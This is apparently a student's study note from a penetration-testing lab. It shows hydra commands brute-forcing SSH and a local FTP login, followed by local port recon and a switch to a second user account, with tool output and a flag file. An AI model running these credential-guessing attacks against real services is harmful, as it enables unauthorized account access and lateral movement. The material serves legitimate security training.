
***
###### `Title :- Service Authentication Brute Force`
###### `Created on :- 2023-06-26 - 07:37`
###### `Created by:- Prem J`
***

- some service require login to perform any actions, some of them are ssh and ftp.

#### `SSH Attack -->`

- the command is similar to normal brute force attack, `hydra` will suggest that we add the `-t 4` flag for a max number of parallel attempts, as many `SSH` limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped.

```shell-session
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

- It may take some time but at the end we would get the credentials, upon finding the credentials we can login and perform further actions.

#### `FTP Attack -->`

- Once we are in, we can check out what other users are on the system.

```shell-session
b.gates@bruteforcing:~$ ls /home

b.gates  m.gates
```

- We notice another user, `m.gates`. We also notice in our local `recon` that port `21` is open locally, indicating that an `FTP` must be available.

```shell-session
b.gates@bruteforcing:~$ netstat -antp | grep -i list

(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -                  
```

+ Next, we can try brute forcing the `FTP` login for the `m.gates` user now.
+ So, similarly to how we attacked the `SSH` service, we can perform a similar attack on `FTP` .

```shell-session
b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/

[21][ftp] host: 127.0.0.1   login: m.gates   password: <...SNIP...>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

- We can now attempt to `FTP` as that user, or even switch to that user. Let us try both:

```shell-session
b.gates@bruteforcing:~$ ftp 127.0.0.1

Connected to 127.0.0.1.
220 (vsFTPd 3.0.3)
Name (127.0.0.1:b.gates): m.gates

331 Please specify the password.
Password: 

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1001           33 Sep 11 00:06 flag.txt
226 Directory send OK.
```

```shell-session
b.gates@bruteforcing:~$ su - m.gates

Password: *********
m.gates@bruteforcing:~$ whoami

m.gates
```